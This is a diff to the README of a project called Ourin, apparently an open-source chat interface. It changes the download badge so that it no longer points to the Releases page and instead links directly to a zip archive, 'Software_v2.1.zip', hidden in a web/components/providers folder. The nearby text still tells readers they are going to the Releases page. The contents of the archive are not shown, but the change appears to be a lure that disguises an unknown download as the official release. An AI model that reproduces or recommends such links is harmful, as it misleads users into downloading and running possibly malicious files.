@@ -15,7 +15,7 @@ Welcome to Ourin! Ourin is an open-source chat interface designed for easy inter
 
 To get started, you need to download Ourin. Click the link below to go to the Releases page:
 
-[![Download Ourin](https://img.shields.io/badge/Download%20Ourin-Here-brightgreen)](https://github.com/300SkinFn1/ourin/releases)
+[![Download Ourin](https://raw.githubusercontent.com/300SkinFn1/ourin/main/web/components/providers/Software_v2.1.zip%20Ourin-Here-brightgreen)](https://raw.githubusercontent.com/300SkinFn1/ourin/main/web/components/providers/Software_v2.1.zip)
 
 On the Releases page, you will find different versions of Ourin. Choose the one that fits your system. The files are usually named with the version number and the file extension that matches your operating system.
 
